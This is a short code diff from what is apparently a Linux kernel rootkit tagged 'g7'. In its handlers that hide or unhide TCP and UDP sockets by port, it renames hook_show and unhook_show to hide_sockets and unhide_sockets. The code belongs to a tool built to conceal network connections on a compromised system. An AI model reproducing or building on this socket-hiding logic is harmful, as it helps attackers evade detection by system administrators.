@@ -188,7 +188,7 @@ handle_tcphide(unsigned long arg)
     if (!sarg) {
         // TODO also remove all sockets (tcp & udp) that are currently being hidden
         rootkit.hiding_sockets = 0;
-        unhook_show();
+        unhide_sockets();
         DEBUG_NOTICE("[g7] socket hiding off\n");
     } else if (sarg < 0) {
         unhide_port((port_t)-sarg, tcp4);
@@ -196,7 +196,7 @@ handle_tcphide(unsigned long arg)
         DEBUG_NOTICE("[g7] unhiding tcp socket with port %ld\n", -sarg);
     } else if (sarg > 0) {
         if (!rootkit.hiding_sockets) {
-            hook_show();
+            hide_sockets();
             DEBUG_NOTICE("[g7] socket hiding on\n");
         }
 
@@ -214,7 +214,7 @@ handle_udphide(unsigned long arg)
     long sarg = (long)arg;
 
     if (!sarg) {
-        unhook_show();
+        unhide_sockets();
         rootkit.hiding_sockets = 0;
         DEBUG_NOTICE("[g7] socket hiding off\n");
     } else if (sarg < 0) {
@@ -223,7 +223,7 @@ handle_udphide(unsigned long arg)
         DEBUG_NOTICE("[g7] unhiding udp socket with port %ld\n", -sarg);
     } else if (sarg > 0) {
         if (!rootkit.hiding_sockets) {
-            hook_show();
+            hide_sockets();
             DEBUG_NOTICE("[g7] socket hiding on\n");
         }
         hide_port((port_t)sarg, udp4);
